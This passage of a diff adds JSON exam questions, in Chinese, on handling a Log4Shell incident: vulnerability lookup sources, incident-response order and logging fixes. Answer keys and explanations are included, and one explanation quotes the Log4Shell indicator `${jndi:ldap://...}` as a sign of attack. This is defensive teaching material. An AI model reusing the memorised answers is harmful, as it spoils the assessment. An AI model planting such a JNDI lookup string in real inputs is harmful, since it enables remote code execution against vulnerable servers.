+        "A": "日誌訊息顯示的是 LDAP 連線嘗試，並無證據顯示已「成功下載惡意軟體」。日誌中出現的是連線嘗試（attempt）或錯誤訊息，並非成功下載的紀錄。",
+        "B": "日誌中的異常訊息涉及 JNDI/LDAP 連線，與 SMB 伺服器無關。這不是設定錯誤的問題，而是疑似遭受攻擊的跡象。",
+        "C": "日誌中出現 JNDI/LDAP 相關的異常連線嘗試（如 `${jndi:ldap://...}` 相關訊息），與 Log4Shell（CVE-2021-44228）攻擊特徵高度吻合。這表示應用程式可能使用了含有漏洞的 Log4j 版本，被攻擊者嘗試利用 JNDI Lookup 功能連線至外部 LDAP 伺服器，以達成遠端程式碼執行。",
+        "D": "LDAP 連線失敗與記憶體不足無關。日誌中的 LDAP 連線嘗試是攻擊行為觸發的，而非因系統資源不足造成的錯誤。"
+      },
+      "general_explanation": "",
+      "key_points": "在日誌分析中發現 JNDI/LDAP 相關的異常連線嘗試，是 Log4Shell 攻擊的典型指標（IoC）。應立即進行弱點評估與事件處理。 ---"
+    },
+    {
+      "id": 38,
+      "type": "single",
+      "context": "",
+      "question": "【題組5】若懷疑應用程式伺服器存在弱點，關於弱點評估，下列敘述何者「不」正確？",
+      "options": {
+        "A": "可透過CVE 網站，查詢已公開或未公開的弱點資訊",
+        "B": "可透過網站伺服器之存取紀錄分析，判斷是否遭受攻擊",
+        "C": "可透過NVD（National Vulnerability Database）資料庫之商業服務，進行弱點掃描偵測",
+        "D": "可透過Exploit-DB 資料庫搜尋，可能相關之攻擊代碼"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "CVE（Common Vulnerabilities and Exposures）網站是查詢已知漏洞資訊的權威來源，可用於確認應用程式所使用的元件是否存在已公開的弱點。",
+        "B": "分析網站伺服器的存取紀錄（Access Log）可以找出攻擊者的嘗試痕跡，如異常的 URL 請求、特殊的 User-Agent、攻擊載荷等，有助於判斷是否遭受攻擊。",
+        "C": "NVD（National Vulnerability Database，國家弱點資料庫）是由美國 NIST 維護的**公開免費**弱點資料庫，並非商業服務，也不提供弱點掃描偵測功能。NVD 是查詢弱點資訊的參考資料庫，弱點掃描應使用 Nessus、OpenVAS、Qualys 等專門的掃描工具。",
+        "D": "Exploit-DB 是一個公開的漏洞利用程式碼資料庫，資安人員可在其中搜尋與特定 CVE 相關的 PoC（Proof of Concept）攻擊程式碼，用於驗證弱點是否可被利用。"
+      },
+      "general_explanation": "",
+      "key_points": "NVD 是免費公開的弱點資訊資料庫（非商業掃描服務）；CVE 提供弱點識別；Exploit-DB 提供攻擊驗證程式碼；存取紀錄分析是判斷攻擊的重要手段。 ---"
+    },
+    {
+      "id": 39,
+      "type": "single",
+      "context": "",
+      "question": "【題組5】若有跡證顯示伺服器已受駭，並確認為所安裝之軟體或元件存在弱點，下列資安事故處理流程何者較「不」正確？",
+      "options": {
+        "A": "疑似受駭伺服器，原系統立即重新安裝系統與應用程式",
+        "B": "於應用程式防火牆或入侵偵測系統，設定阻擋規則以緩解",
+        "C": "依據資產清冊盤點弱點軟體狀態，排定更新計畫並執行",
+        "D": "分析系統與網路日誌，清查攻擊者未進行內部橫向移動"
+      },
+      "answers": [
+        "A"
+      ],
+      "explanations": {
+        "A": "在資安事故處理中，**絕對不應立即重新安裝系統**。這樣做會銷毀所有數位鑑識（Digital Forensics）所需的證據，包括惡意程式檔案、攻擊痕跡、記憶體中的可疑程序、系統日誌等。正確的做法應先進行證據保全（如製作磁碟映像、匯出日誌），完成鑑識分析後，確認影響範圍與攻擊方式，再進行系統重建。",
+        "B": "在緊急應變階段，於 WAF 或 IDS/IPS 上設定阻擋規則是有效的緩解措施，可以即時阻擋已知攻擊模式，爭取修補時間。",
+        "C": "依據資產清冊盤點受影響的軟體範圍，排定修補更新計畫並執行，是系統性解決弱點問題的正確流程。",
+        "D": "分析系統與網路日誌以確認攻擊者是否已進行橫向移動（Lateral Movement）是資安事故處理的關鍵步驟，可確定受影響範圍並防止進一步擴散。"
+      },
+      "general_explanation": "",
+      "key_points": "資安事故處理流程：偵測 → 證據保全 → 分析調查 → 圍堵緩解 → 根除修復 → 復原 → 檢討改進。在未完成鑑識前，不應銷毀任何證據。 ---"
+    },
+    {
+      "id": 40,
+      "type": "multiple",
+      "context": "",
+      "question": "【題組5】針對此次資安事故進行根因分析，確認為未能即時識別系統中惡意活動，下列矯正措施敘述哪些正確？",
+      "options": {
+        "A": "確保帳號登錄、存取控制或輸入驗證等異常事件，皆留存於日誌中，並保留足夠資訊以識別攻擊來源",
+        "B": "日誌留存需為合理時間，以供後續電腦鑑識查閱使用",
+        "C": "建立監控告警機制，確保可疑活動於接受時間內發現處置",
+        "D": "全面執行滲透測試或紅隊演練，並確保相關攻擊皆未於日誌中留下軌跡，即代表資安縱深防護已趨近完善"
+      },
+      "answers": [
+        "A",
+        "B",
+        "C"
+      ],
+      "explanations": {
+        "A": "全面的日誌記錄是偵測惡意活動的基礎。確保帳號登入/登出、存取控制變更、輸入驗證失敗等安全相關事件都被完整記錄於日誌中，並包含足夠的詳細資訊（如來源 IP、時間戳記、操作者、操作內容等），才能在事件發生時有效追蹤攻擊來源。這符合 OWASP 安全日誌記錄的最佳實踐。",
+        "B": "日誌應保留合理的時間長度（依法規與組織政策，通常至少六個月以上），以確保在資安事件發生後，電腦鑑識人員能夠回溯分析足夠長的時間範圍，找出攻擊的起始點、影響範圍與攻擊者的完整活動軌跡。",
+        "C": "僅有日誌記錄是不夠的，還需建立主動的監控與告警機制（如 SIEM 系統），確保可疑活動在可接受的時間內（依據組織的風險承受度）被發現並進行處置。這正是此次事故的根因——未能「即時識別」惡意活動——所對應的核心矯正措施。",
+        "D": "此選項的邏輯根本錯誤。「確保相關攻擊皆未於日誌中留下軌跡」恰恰代表日誌記錄機制存在嚴重不足，而非資安防護完善。良好的資安縱深防護應確保攻擊行為**會被**日誌記錄，以便偵測與應變。若滲透測試或紅隊演練的攻擊行為完全沒有在日誌中留下痕跡，代表監控與日誌機制需要強化，而非已趨近完善。"
+      },
+      "general_explanation": "",
+      "key_points": "資安監控三要素：完整的日誌記錄、適當的日誌留存期限、主動的監控告警機制。日誌應記錄攻擊痕跡（非隱藏攻擊痕跡）才代表防護有效。 ---"
+    }
+  ]
+}
